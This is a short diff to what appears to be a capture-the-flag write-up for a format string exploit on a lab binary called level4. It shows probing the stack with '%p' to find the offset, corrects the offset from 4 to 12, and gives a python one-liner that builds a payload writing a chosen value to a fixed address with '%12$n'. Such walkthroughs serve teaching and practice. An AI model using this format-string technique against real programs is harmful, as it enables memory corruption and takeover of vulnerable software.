@@ -8,7 +8,7 @@ $> ./level4
 AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p
 AAAA 0xb7ff26b0 0xbffff764 0xb7fd0ff4 (nil) (nil) 0xbffff728 0x804848d 0xbffff520 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520
 
-- So the offset is 4, Now we need to make the payload for exploiting.
+- So the offset is 12, Now we need to make the payload for exploiting.
 16930116 - 4 = 16930112
 
 $> python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' > /tmp/payload
